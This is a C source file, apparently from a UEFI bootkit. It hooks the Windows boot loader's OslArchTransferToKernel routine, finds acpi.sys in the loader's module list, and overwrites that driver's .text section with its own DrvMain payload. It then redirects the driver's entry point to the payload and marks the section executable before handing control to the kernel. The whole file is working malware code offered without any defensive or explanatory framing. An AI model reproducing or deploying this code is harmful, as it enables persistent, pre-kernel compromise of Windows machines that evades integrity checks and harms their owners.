#include "Common.h"

typedef struct
{
	ULONG		OsMajorVersion;
	ULONG		OsMinorVersion;
	ULONG		Length;
	ULONG		Reserved;
	LIST_ENTRY	LoadOrderListHead;
	LIST_ENTRY	MEmoryDescriptorListHead;
	LIST_ENTRY	BootDriverListHead;
} PARAMETER_BLOCK, *PPARAMETER_BLOCK ;


D_SEC( B ) VOID EFIAPI OslArchTransferToKernelHook( _In_ PVOID LoaderBlock, _In_ PVOID Entry )
{
	SIZE_T			Len = 0;
	PEFTBL			Eft = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PPARAMETER_BLOCK	Blk = NULL;
	PIMAGE_DOS_HEADER	Ntd = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	/* Get EfiTable address */
	Eft = C_PTR( G_PTR( EfTbl ) );
	Blk = C_PTR( LoaderBlock );

	/* Initialize list values */
	Hdr = & Blk->LoadOrderListHead;
	Ent = Hdr->Flink;

	/* Enumerate the list to completion */
	while ( C_PTR( Ent ) != C_PTR( Hdr ) ) {

		/* Get the LDR_DATA_TABLE_ENTRY */
		Ldr = CONTAINING_RECORD( Ent, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );

		/* Is this acpi.sys? */
		if ( HashString( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length ) == 0x5dc8930f ) {
			Dos = C_PTR( Ldr->DllBase );
			Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
			Sec = IMAGE_FIRST_SECTION( Nth );

			/* Enumerate all the PE Sections */
			for ( INT Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
				/* Is this a .text section? */
				if ( HashString( & Sec[ Idx ].Name, 0 ) == 0x0b6dca4d ) {

					/* Locate the ntoskrnl image base */
					Ntd = C_PTR( U_PTR( U_PTR( Entry ) &~ ( 0x1000 - 1 ) ) );
					while ( Ntd->e_magic != IMAGE_DOS_SIGNATURE ) {
						/* Decrement by a page! */
						Ntd = C_PTR( U_PTR( Ntd ) - 0x1000 );
					};

					/* Store information for DrvMain to retrieve */
					Eft->KernelBuf                 = C_PTR( G_PTR( EfiMain ) );
					Eft->KernelLen                 = U_PTR( ( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( EfiMain ) ) );
					Eft->KernelBase                = C_PTR( Ntd );
					Eft->TgtDrvImgSect             = C_PTR( & Sec[ Idx ] );
					Eft->TgtDrvImgBase             = C_PTR( Ldr->DllBase );
					Eft->TgtDrvLdrEntry            = C_PTR( Ldr );
					Eft->TgtDrvAddressOfEntrypoint = Nth->OptionalHeader.AddressOfEntryPoint;

					/* Find the total length of the buffer */
					Len = C_PTR( U_PTR( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( DrvMain ) ) );

					/* Insert DrvMainStart */
					__builtin_memcpy( C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress ), C_PTR( G_PTR( DrvMain ) ), Len );

					/* Insert a hook! */
					Ldr->EntryPoint                         = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );
					Nth->OptionalHeader.AddressOfEntryPoint = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );

					/* Set -x permission in section */
					Sec[ Idx ].Characteristics |= IMAGE_SCN_MEM_EXECUTE;

					/* Break! */
					break;
				};
			};
			/* Break! */
			break;
		};

		/* Next entry */
		Ent = C_PTR( Ent->Flink );
	};

	/* Execute original OslArchTransferToKernel stub and callgate */
	( ( __typeof__( OslArchTransferToKernelHook ) * ) Eft->OslArchTransferToKernelGate )( LoaderBlock, Entry );
};
